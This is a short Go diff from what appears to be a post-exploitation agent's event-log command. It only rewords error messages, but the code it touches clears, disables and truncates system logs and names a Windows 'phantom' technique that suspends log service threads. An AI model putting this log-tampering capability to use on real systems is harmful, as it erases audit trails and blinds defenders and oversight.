@@ -51,9 +51,9 @@ func (c *EventLogCommand) Execute(task structs.Task) structs.CommandResult {
 	case "enable", "disable":
 		return eventlogDarwinToggle(args.Action, args.Channel)
 	case "phantom":
-		return errorResult("Error: phantom action is Windows only — suspends log service threads in host process")
+		return errorResult("phantom action is Windows only — suspends log service threads in host process")
 	case "delete-events":
-		return errorResult("Error: delete-events action is Windows only — uses EvtExportLog/EvtClearLog APIs")
+		return errorResult("delete-events action is Windows only — uses EvtExportLog/EvtClearLog APIs")
 	default:
 		return errorf("Unknown action: %s (use list, query, clear, info, enable, disable, phantom, delete-events)", args.Action)
 	}
@@ -277,7 +277,7 @@ func eventlogDarwinClear(channel string) structs.CommandResult {
 	// If channel is a file path, truncate it directly
 	if strings.HasPrefix(channel, "/") {
 		if err := os.Truncate(channel, 0); err != nil {
-			return errorf("Error truncating %s: %v", channel, err)
+			return errorf("truncating %s: %v", channel, err)
 		}
 		return successf("Truncated %s to 0 bytes", channel)
 	}
